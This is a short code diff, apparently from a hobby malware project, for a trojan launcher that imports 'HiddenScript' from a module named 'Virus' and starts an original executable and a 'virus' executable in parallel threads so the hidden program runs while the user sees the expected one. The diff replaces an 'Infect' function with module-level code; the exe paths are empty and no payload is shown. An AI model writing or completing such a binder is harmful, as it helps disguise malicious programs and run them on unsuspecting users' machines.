@@ -1,12 +1,18 @@
 import threading
 import os
 from Virus import HiddenScript
+from shutil import move
 
-def OriginalFile(exepath):
+def RunFile(exepath):
     os.startfile(exepath)
 
-def Infect(exepath):
-    orgfile = threading.Thread(target=OriginalFile, args=(exepath))
-    ViralScript = threading.Thread(target=HiddenScript)
-    orgfile.start()
-    ViralScript.start()
+def Infect():
+    pass
+
+OrgExePath = ""
+VirusExePath = ""
+
+orgfile = threading.Thread(target=RunFile, args=(OrgExePath))
+ViralScript = threading.Thread(target=RunFile, args=(VirusExePath))
+orgfile.start()
+ViralScript.start()
